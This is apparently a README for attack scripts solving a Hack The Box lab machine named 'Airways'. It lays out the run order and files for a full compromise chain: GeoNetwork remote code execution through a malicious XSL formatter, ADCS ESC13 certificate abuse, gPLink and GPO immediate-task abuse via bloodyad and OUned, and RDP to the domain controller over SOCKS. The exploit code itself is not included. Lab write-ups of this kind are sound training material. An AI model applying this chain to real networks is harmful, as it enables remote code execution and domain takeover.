# Airways scripts

Fill `../secrets.example.env` → `../secrets.env` locally. Hosts: `geo.airways.htb`, `airways.htb`.

```bash
export TARGET=<ip> LHOST=<tun0>
chmod +x *.sh *.py
./replay.sh hosts
# terminal A: python3 -m http.server 8888   (payload for FORMATTER_CMD)
./replay.sh rce
# SOCKS, then on WKSTN01 as Isabel:
#   powershell -File 02-enroll-esc13.ps1
# Kali:
#   patched gettgtpkinit  (pkinit-ecdsa.patch)
#   OUned --config ouned.example.ini
#   ./03-gplink.sh
#   ./04-rdp-dc.sh
```

| File | Where | What |
|------|-------|------|
| `01-geonetwork-rce.py` | Kali | XSRF + formatter ZIP + trigger |
| `formatter/view.xsl` | Kali | Saxon `Runtime.exec` (cmd from env) |
| `02-enroll-esc13.ps1` | WKSTN01 as Isabel | CertEnroll / Get-Certificate |
| `03-gplink.sh` | Kali | `bloodyad -k` `gPLink` |
| `ouned.example.ini` | Kali | user Immediate Task, domain SMB |
| `04-rdp-dc.sh` | Kali | Isabel NLA to DC01 via SOCKS |
| `pkinit-ecdsa.patch` | Kali | PKINITtools ECDSA SHA-256 CMS |

`proxychains4` config needs `localnet` for the tun0 addresses you bind LDAP/SMB on, otherwise OUned health-checks bounce through SOCKS into the public IP.
